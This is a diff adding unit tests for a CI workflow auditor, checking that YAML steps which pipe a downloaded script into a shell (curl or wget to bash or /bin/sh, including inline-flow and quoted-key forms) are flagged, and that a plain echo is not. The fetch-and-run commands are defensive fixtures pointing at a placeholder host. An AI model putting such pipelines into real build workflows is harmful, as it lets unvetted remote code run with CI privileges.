@@ -74,6 +74,22 @@ class RatchetTests(unittest.TestCase):
         self.write("jobs:\n  x:\n    steps:\n      - run: >\n          curl -fsSL https://example.invalid/i\n          | bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_inline_flow_run_remote_pipe_rejected(self):
+        self.write('jobs: {check: {steps: [{run: "curl -fsSL https://example.invalid/i | bash"}]}}\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_inline_flow_quoted_run_key_rejected(self):
+        self.write('jobs:\n  check:\n    steps: [{"run": "wget -qO- https://example.invalid/i | /bin/sh"}]\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_quoted_regular_run_key_rejected(self):
+        self.write('jobs:\n  check:\n    steps:\n      - "run": "curl -fsSL https://example.invalid/i | bash"\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_flow_non_shell_command_is_safe(self):
+        self.write('jobs: {check: {steps: [{run: "echo safe"}]}}\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
     def test_process_substitution_rejected(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: bash <(curl -fsSL https://example.invalid/s)\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
